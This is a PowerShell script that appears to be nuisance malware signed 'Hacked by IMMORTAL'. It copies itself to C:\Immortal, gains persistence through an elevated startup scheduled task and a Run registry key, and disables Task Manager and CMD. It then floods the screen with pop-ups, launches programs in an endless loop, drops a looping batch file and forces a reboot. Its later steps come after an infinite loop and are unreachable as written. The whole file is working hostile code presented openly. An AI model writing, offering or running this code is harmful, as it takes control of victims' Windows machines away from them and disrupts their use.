# Persistent Setup - Scheduled Task & Registry
$taskName = "ImmortalTask"
$scriptPath = "C:\Immortal\Immortal.ps1"
$batchPath = "C:\Immortal\keepalive.bat"

# Ensure directory exists
if (!(Test-Path "C:\Immortal")) {
    New-Item -Path "C:\Immortal" -ItemType Directory -Force | Out-Null
}

# Copy itself if not already there
if (!(Test-Path $scriptPath)) {
    Copy-Item -Path $MyInvocation.MyCommand.Path -Destination $scriptPath -Force
}

# Scheduled Task for Persistence
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File $scriptPath"
$trigger = New-ScheduledTaskTrigger -AtStartup
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -RunLevel Highest -Force

# Registry Key Persistence
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Immortal" -Value "powershell.exe -ExecutionPolicy Bypass -File $scriptPath"

# Disable Task Manager, CMD, and PowerShell
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableTaskMgr" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "DisableCMD" -Value 1 -Force
Set-ItemProperty -Path "HKCU:\Software\Policies\Microsoft\Windows\System" -Name "DisableCMD" -Value 1 -Force

# Spam Pop-Ups - Endless
for ($i = 0; $i -lt 20; $i++) {
    Start-Process powershell -ArgumentList "-Command `"Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Hacked by IMMORTAL')`""
    Start-Sleep -Seconds 1
}

# Open Random Applications Forever
while ($true) {
    Start-Process "notepad.exe"
    Start-Process "calc.exe"
    Start-Process "mspaint.exe"
    Start-Sleep -Seconds 5
}

# Generate Junk Files
for ($i = 1; $i -le 100; $i++) {
    $file = "C:\Immortal\spamfile$i.txt"
    Set-Content -Path $file -Value ("IMMORTAL RULES " * 1000)
}

# Batch File for Infinite Loops
@"
@echo off
:loop
start notepad.exe
start mspaint.exe
start cmd.exe
goto loop
"@ | Out-File -Encoding ASCII -FilePath $batchPath

Start-Process "cmd.exe" -ArgumentList "/c $batchPath"

# Reboot the System After 10 Minutes
Start-Sleep -Seconds 600
Restart-Computer -Force
